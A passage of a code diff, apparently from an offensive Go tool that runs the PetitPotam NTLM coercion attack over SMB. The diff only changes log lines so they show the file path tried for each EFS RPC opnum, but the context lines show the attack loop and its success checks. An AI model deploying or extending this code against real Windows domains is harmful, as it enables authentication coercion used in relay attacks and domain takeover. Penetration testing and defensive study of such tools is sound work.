@@ -544,7 +544,7 @@ func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, li
 		// Try all path variations for this opnum
 		for pathIdx, testPath := range pathVariations {
 			if verbose {
-				fmt.Printf("[DEBUG] Path variation %d/%d\n", pathIdx+1, len(pathVariations))
+				fmt.Printf("[DEBUG] Path variation %d/%d: %s\n", pathIdx+1, len(pathVariations), strings.TrimRight(testPath, "\x00"))
 			}
 
 			stub := createEfsRpcStub(testPath, uint16(opnum))
@@ -556,19 +556,21 @@ func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, li
 						fmt.Printf("[-] Path variation %d: ACCESS_DENIED\n", pathIdx+1)
 					}
 				} else if err.Error() == "got ERROR_BAD_NETPATH (0x6f7) - attack likely worked" {
-					fmt.Printf("[+] Opnum %d (%s) path variation %d got ERROR_BAD_NETPATH - coercion successful!\n", opnum, funcName, pathIdx+1)
+					pathDisplay := strings.TrimRight(testPath, "\x00")
+					fmt.Printf("[+] Opnum %d (%s) path variation %d (%s) got ERROR_BAD_NETPATH - coercion successful!\n", opnum, funcName, pathIdx+1, pathDisplay)
 					successfulOpnum = int(opnum)
 					break // Success - no need to try other paths for this opnum
 				}
 				lastErr = err
 			} else {
+				pathDisplay := strings.TrimRight(testPath, "\x00")
 				// Opnum 0 (EfsRpcOpenFileRaw) often returns success when patched
 				if opnum == 0 {
 					if verbose {
-						fmt.Printf("[!] Opnum 0 path variation %d returned success (may be patched)\n", pathIdx+1)
+						fmt.Printf("[!] Opnum 0 path variation %d (%s) returned success (may be patched)\n", pathIdx+1, pathDisplay)
 					}
 				} else {
-					fmt.Printf("[+] Opnum %d (%s) path variation %d completed successfully\n", opnum, funcName, pathIdx+1)
+					fmt.Printf("[+] Opnum %d (%s) path variation %d (%s) completed successfully\n", opnum, funcName, pathIdx+1, pathDisplay)
 				}
 				successfulOpnum = int(opnum)
 				break // Success - no need to try other paths for this opnum
